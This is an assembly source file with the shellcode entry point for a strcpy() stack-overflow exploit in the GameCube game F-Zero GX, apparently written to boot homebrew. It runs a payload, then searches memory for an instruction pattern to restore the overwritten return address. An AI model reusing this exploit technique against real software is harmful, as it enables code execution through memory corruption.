/* F-Zero GX strcpy() shellcode entrypoint
 * numbers & meta -- 2018
 *
 * If you aren't planning on restoring execution into F-Zero GX (ie. you just
 * want to boot homebrew and don't care about clobbering the game), much of
 * this code is totally useless to you.
 */


/* NUL-terminate the string we used to overflow the stack. Need to do this so
 * we can safely return into execution later (if desired). The mechanics of
 * the subsequent strcpy() calls after our are not well understood atm.
 */

_start:
	mflr	r8
	stw	r10, -0xA0(r8)
	xor	r8, r8, r8

/* Execute some payload defined in main.c I don't know if it's necessary to
 * change the stack pointer way up in memory here, but it seems to work out
 * alright for now? lol
 */

_execute_payload:
	lis	r8, 0x817a
	stw	r1, 0x0000(r8)
	
	lis	r1, 0x817b
	mflr	r0
	bl	do_payload

	lis	r8, 0x817a
	lwz	r1, 0x0000(r8)

/* In Dolphin, the LR we write over is consistently 0x80309564. In any case,
 * we always successfully exploit the same code path. On hardware, placement
 * of the vulnerable function in memory is actually variable (!), so we need
 * to do a little search for the instruction immediately after our branch into
 * the wrapper around strcpy(). These are the values around the LR in Dolphin:
 *
 *	0x80309564: 7c600734
 *	0x80309568: 2c000002
 *	0x8030956c: 40800030
 *	0x80309570: 7c7cd82e
 *
 * If we can't find this pattern, branch into die() in src/main.c and write
 * garbage to the framebuffer. This at least helps us disambiguate somewhat
 * among different failure modes (probably use that mechanism elsewhere if
 * necessary later on).
 *
 * If Dolphin is to be trusted, assume that r{6,8,9,10,11} are free for us to
 * clobber (in that they're zeroed out already - although maybe it doesn't
 * matter because these are typically transient?)
 */

_searchdown:
	lis	r6, 0x8030
	addi	r6, r6, 0x7564
	addi	r6, r6, 0x2000
	lis	r11, 0x802f
_searchdown_a:
	// If we reach addresses < 0x802f0000, try searching upwards
	cmpw	r6, r11
	blt	_searchup

	lwz	r10, 0x0000(r6)
	lis	r9, 0x7c60
	addi	r9, r9, 0x0734
	cmpw	r9, r10
	beq	_searchdown_b
	subi	r6, r6, 0x4
	b	_searchdown_a
_searchdown_b:
	lwz	r10, 0x0004(r6)
	lis	r9, 0x2c00
	addi	r9, r9, 0x0002
	cmpw	r9, r10
	beq	_searchdown_c
	subi	r6, r6, 0x4
	b	_searchdown_a
_searchdown_c:
	lwz	r10, 0x0008(r6)
	lis	r9, 0x4080	
	addi	r9, r9, 0x0030
	cmpw	r9, r10
	beq	_searchdown_d
	subi	r6, r6, 0x4
	b	_searchdown_a
_searchdown_d:
	lwz	r10, 0x000c(r6)
	lis	r9, 0x7c7c
	addi	r9, r9, 0x782e
	addi	r9, r9, 0x6000
	cmpw	r9, r10
	beq	_restore_lr
	subi	r6, r6, 0x4
	b	_searchdown_a

_searchup:
	lis	r6, 0x8030
	addi	r6, r6, 0x7564
	addi	r6, r6, 0x2000
	lis	r11, 0x8031
_searchup_a:
	// If we reach an address > 0x80310000, call die() to indicate that we
	// can't find the proper LR within the range 0x802f0000-0x80310000
	cmpw	r6, r11
	bgt	_die

	lwz	r10, 0x0000(r6)
	lis	r9, 0x7c60
	addi	r9, r9, 0x0734
	cmpw	r9, r10
	beq	_searchup_b
	addi	r6, r6, 0x4
	b	_searchup_a
_searchup_b:
	lwz	r10, 0x0004(r6)
	lis	r9, 0x2c00
	addi	r9, r9, 0x0002
	cmpw	r9, r10
	beq	_searchup_c
	addi	r6, r6, 0x4
	b	_searchup_a
_searchup_c:
	lwz	r10, 0x0008(r6)
	lis	r9, 0x4080	
	addi	r9, r9, 0x0030
	cmpw	r9, r10
	beq	_searchup_d
	addi	r6, r6, 0x4
	b	_searchup_a
_searchup_d:
	lwz	r10, 0x000c(r6)
	lis	r9, 0x7c7c
	addi	r9, r9, 0x782e
	addi	r9, r9, 0x6000
	cmpw	r9, r10
	beq	_restore_lr
	addi	r6, r6, 0x4
	b	_searchup_a

_die:
	b	die
_restore_lr:
	mtctr	r6
	
	// Zero out the registers we clobbered
	xor	r6, r6, r6
	xor	r8, r8, r8
	xor	r9, r9, r9
	xor	r10, r10, r10
	xor	r11, r11, r11

	// Restore the old return code in r3 before branching.
	// I *think* this is necessary to return cleanly.
	li	r3, 1
	bctr
